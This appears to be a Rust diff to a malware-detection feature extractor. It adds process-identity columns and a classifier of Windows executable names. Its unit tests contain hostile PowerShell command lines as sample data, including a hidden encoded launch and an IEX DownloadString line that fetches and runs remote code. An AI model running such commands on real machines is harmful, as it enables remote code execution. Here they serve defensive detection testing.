@@ -33,7 +33,7 @@ use crate::dsl::Action;
 use crate::event::Record;
 
 /// How many floats describe one event.
-pub const WIDTH: usize = 33;
+pub const WIDTH: usize = 35;
 
 /// How many events make up one story.
 ///
@@ -50,6 +50,32 @@ pub struct Features(pub [f32; WIDTH]);
 impl Default for Features {
     fn default() -> Self {
         Self([0.0; WIDTH])
+    }
+}
+
+/// What kind of program a path is, for the process-identity columns.
+///
+/// The list is short on purpose. The question the model needs answered is
+/// "could this process have written this?", and eight answers cover what runs on
+/// a Windows desktop: a script host, the command processor, a Windows scripting
+/// host, an Office application, a browser, a compiler, a system process, or
+/// something else. A finer list would be a list of software, which changes every
+/// week and is what the rules are for.
+pub fn image_class(path: Option<&str>) -> u8 {
+    let Some(path) = path else {
+        return 8;
+    };
+    let lower = path.to_ascii_lowercase();
+    let name = lower.rsplit('\\').next().unwrap_or("");
+    match name {
+        "powershell.exe" | "pwsh.exe" => 0,
+        "cmd.exe" => 1,
+        "wscript.exe" | "cscript.exe" | "mshta.exe" => 2,
+        "winword.exe" | "excel.exe" | "powerpnt.exe" | "outlook.exe" => 3,
+        "chrome.exe" | "msedge.exe" | "firefox.exe" => 4,
+        "cargo.exe" | "rustc.exe" | "link.exe" | "cl.exe" | "node.exe" | "python.exe" => 5,
+        "svchost.exe" | "services.exe" | "lsass.exe" | "wininit.exe" | "explorer.exe" => 6,
+        _ => 7,
     }
 }
 
@@ -173,7 +199,12 @@ impl Features {
     /// `micros_since_previous` is the gap, which is the only sense of *order*
     /// the model gets beyond the sequence itself: a burst inside one second
     /// looks nothing like the same writes spread over an hour.
-    pub fn of(record: &Record, micros_since_previous: u64) -> Self {
+    pub fn of(
+        record: &Record,
+        micros_since_previous: u64,
+        image_class: f32,
+        parent_class: f32,
+    ) -> Self {
         let mut data = [0.0f32; WIDTH];
         data[action_class(record.action)] = 1.0;
         data[11 + path_class(record.path.as_deref())] = 1.0;
@@ -186,6 +217,13 @@ impl Features {
         // vector.
         let seconds = (micros_since_previous as f32 + 1.0).log10() / 6.0;
         data[32] = seconds.min(1.0);
+        // The process itself. A build and a dropper both write a burst of files;
+        // what separates them is that one is `cargo` and the other is a
+        // PowerShell started by a PowerShell from a temp directory. The classes
+        // are normalised rather than one-hot because two columns have to fit in
+        // a vector that is already mostly zeros.
+        data[33] = image_class / 8.0;
+        data[34] = parent_class / 8.0;
         Self(data)
     }
 }
@@ -229,7 +267,7 @@ impl Story {
         if self.events.len() == LENGTH {
             self.events.remove(0);
         }
-        self.events.push(Features::of(record, gap));
+        self.events.push(Features::of(record, gap, 8.0, 8.0));
         if self.image.is_none() {
             if let Some(path) = &record.path {
                 self.image = Some(path.clone());
@@ -288,8 +326,8 @@ mod tests {
 
     #[test]
     fn a_temp_path_and_a_system_path_are_different_columns() {
-        let temp = Features::of(&record(Action::FileWritten, Some(r"C:\Users\x\AppData\Local\Temp\a.exe")), 0);
-        let system = Features::of(&record(Action::FileWritten, Some(r"C:\Windows\System32\a.exe")), 0);
+        let temp = Features::of(&record(Action::FileWritten, Some(r"C:\Users\x\AppData\Local\Temp\a.exe")), 0, 8.0, 8.0);
+        let system = Features::of(&record(Action::FileWritten, Some(r"C:\Windows\System32\a.exe")), 0, 8.0, 8.0);
         assert_eq!(temp.0[11 + 0], 1.0, "temp is class 0");
         assert_eq!(system.0[11 + 3], 1.0, "system32 is class 3");
     }
@@ -302,6 +340,8 @@ mod tests {
                 Some(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"),
             ),
             0,
+            8.0,
+            8.0,
         );
         assert_eq!(run.0[24 + 0], 1.0);
     }
@@ -312,7 +352,7 @@ mod tests {
         event.command_line = Some(
             "powershell -NoProfile -WindowStyle Hidden -enc SQBFAFgA".to_string(),
         );
-        let features = Features::of(&event, 0);
+        let features = Features::of(&event, 0, 8.0, 8.0);
         assert_eq!(features.0[28], 1.0, "hidden");
         assert_eq!(features.0[29], 1.0, "encoded");
         assert_eq!(features.0[30], 0.0, "no download");
@@ -323,7 +363,7 @@ mod tests {
         let mut event = record(Action::ProcessStarted, None);
         event.command_line =
             Some("IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')".to_string());
-        let features = Features::of(&event, 0);
+        let features = Features::of(&event, 0, 8.0, 8.0);
         assert_eq!(features.0[30], 1.0, "download");
         assert_eq!(features.0[31], 1.0, "evaluation");
     }
@@ -341,8 +381,8 @@ mod tests {
 
     #[test]
     fn a_gap_is_log_scaled_and_bounded() {
-        let fast = Features::of(&record(Action::FileWritten, None), 1);
-        let slow = Features::of(&record(Action::FileWritten, None), 3_600_000_000);
+        let fast = Features::of(&record(Action::FileWritten, None), 1, 8.0, 8.0);
+        let slow = Features::of(&record(Action::FileWritten, None), 3_600_000_000, 8.0, 8.0);
         assert!(fast.0[32] < slow.0[32]);
         assert!(slow.0[32] <= 1.0);
     }
